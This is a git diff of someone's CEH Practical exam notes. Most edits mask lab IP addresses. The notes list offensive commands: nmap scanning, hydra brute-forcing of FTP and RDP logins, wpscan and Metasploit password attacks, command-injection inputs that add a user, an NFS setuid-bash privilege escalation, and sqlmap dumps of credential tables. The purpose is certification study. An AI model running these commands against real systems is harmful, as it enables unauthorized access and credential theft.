@@ -1,36 +1,36 @@
 # My ceh practical notes
 #  Scanning Networks (always do sudo su) --> To be root
 ```
-1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
-2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
-3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
-If even this the above command is not working then use this command-  namp -f 10.10.10.16
+1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.xx.xx/24 or nmap -T4 -A ip
+2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.xx.xx.xx
+3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.xx.xx.xx 
+If even this the above command is not working then use this command-  namp -f 10.xx.xx.xx
 4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
 5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
-6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
-7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
-8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
+6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.xx.xx
+7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.xx.xx (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
+8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.xx.xx.xx
 9- nmap --script smb-os-discovery -p 445 <DC-IP-Address>
-10- nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.0/24 to identify the number ofmercury services running
-11- nmap -p 3389 --open -sV 10.10.55.0/24 to Identify a machine with RDP service enabled
-12- nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24 or nmap -sV -p 5555 192.168.x.x/2x to identify mobile devices
-13- nmap -p 22 --open 10.10.55.0/24  scan for SSh 
-14- nmap -p 139,445 --open -sV 10.10.55.0/24 or nmap -T4 -A -p 139,445 192.168.x.x/2x  to identify SMB services 
-15- namp -sV -A -p 80 10.10.1.13/24 or nmap -T4 -A 192.168.x.x/2x or nmap -T4 -A -p 80,443 192.168.x.x/2x to identify server running WampServer.
-16- nmap -p 21 192.x.x.0/24   Identify FTP Service
+10- nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.x.xx/24 to identify the number ofmercury services running
+11- nmap -p 3389 --open -sV 10.xx.xx.xx/24 to Identify a machine with RDP service enabled
+12- nmap -p 80,443,8080,8443,5228 --open 10.xx.xx.xx/24 or nmap -sV -p 5555 192.168.x.x/2x to identify mobile devices
+13- nmap -p 22 --open 10.xx.xx.x/24  scan for SSh 
+14- nmap -p 139,445 --open -sV 10.xx.xx.x/24 or nmap -T4 -A -p 139,445 192.168.x.x/2x  to identify SMB services 
+15- namp -sV -A -p 80 10.10.xx.xx/24 or nmap -T4 -A 192.168.x.x/2x or nmap -T4 -A -p 80,443 192.168.x.x/2x to identify server running WampServer.
+16- nmap -p 21 192.168.x.x/24   Identify FTP Service
 ```
 # Enumeration
 ```
-1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
-2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
-3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
-                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
+1- NetBios enum using windows- in cmd type- nbtstat -a 10.xx.xx.xx (-a displays NEtBIOS name table)
+2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.xx.xx.xx
+3- SNMP enum using nmap-  nmap -sU -p 161 10.xx.xx.xx (-p 161 is port for SNMP)--> Check if port is open
+                          snmp-check 10.xx.xx.xx ( It will show user accounts, processes etc) --> for parrot
 4- DNS recon/enum-  dnsrecon -d www.google.com -z
-5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
-6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
-				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
-7- hydra -L username_file -P password_file 192.168.0.x ftp
-ftp 192.168.0.x
+5- FTP enum using nmap-  nmap -p 21 -A 10.xx.xx.xx 
+6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.xx.xx.xx (all info)
+				  enum4linux -u martin -p apple -P 10.xx.xx.xx (policy info)
+7- hydra -L username_file -P password_file 192.168.x.x ftp
+ftp 192.168.x.x
 get file
 cat file
 8- hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X  Crack RDP Credentials
@@ -70,11 +70,11 @@ Thief RAT -> File Manager -> Open folder -> Count files
 						    telnet www.movies.com 80
 						    GET /HTTP/1.0
 2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
-3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
-				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
+3- Crack FTP credentials using nmap-  nmap -p 21 10.xx.xx.xx (check if it is open or not)
+				      ftp 10.xx.xx.xx (To see if it is directly connecting or needing credentials)
 Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
-Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
-4- hydra -l user -P passlist.txt ftp://10.10.10.10
+Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.xx.xx.xx
+4- hydra -l user -P passlist.txt ftp://10.xx.xx.xx
 5- nmap -sV -p 22 <IP/24>  for privilage esclation
    ssh marcus@<IP>
    Sudo -l
@@ -82,12 +82,12 @@ Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Usern
    cd /
    find . -name imroot.txt
    cat givenpath/imroot.txt
-6- nmap -sV —p 2049 IP/Subnet
+6- nmap -sV —p 2049 10.xx.xx.xx/Subnet
 sudo apt-get install nfs-common
 nmap -sV —script=nfs-showmount <Target_IP>
 showmount -e <Target_IP>
 mkdir /tmp/nfs
-sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+sudo mount -t nfs 10.10.x.x:/home /tmp/nfs
 cd /tmp/nfs
 sudo cp /bin/bash .
 sudo chmod +s bash
@@ -108,12 +108,12 @@ find / -name "*.txt" -ls 2> /dev/null
 Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
  						 show options
 						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
-						 set RHOSTS 10.10.10.10  (target ip)
+						 set RHOSTS 10.xx.xx.xx  (target ip)
 						 set RPORT 8080          (target port)
-						 set TARGETURI http://10.10.10.10:8080/
+						 set TARGETURI http://10.xx.xx.xx:8080/
 						 set USERNAME admin
-4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
-			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
+4- Brute Force using WPscan -    wpscan --url http://10.xx.xx.xx:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
+			         wpscan --url http://10.xx.xx.xx:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
 5- Command Injection-  | net user  (Find users)
  		       | dir C:\  (directory listing)
                        | net user Test/Add  (Add a user)
@@ -153,19 +153,19 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
-7.1 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" --dump
-7.2 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" --dbs
-7.3 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name --tables
-7.4 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users --columns
-7.5 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users -C username,password --dump
+7.1 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" --dump
+7.2 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" --dbs
+7.3 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name --tables
+7.4 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users --columns
+7.5 sqlmap -u "http://xyz.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users -C username,password --dump
 8.1 shCopy code
-    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs
+    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 --dbs
 8.2 shCopy code
-    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name --tables
+    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name --tables
 8.3 shCopy code
-    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
+    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
 8.4 shCopy code
-    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
+    sqlmap -u "http://192.168.xx.xx" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
 ```
 # Android
 ```
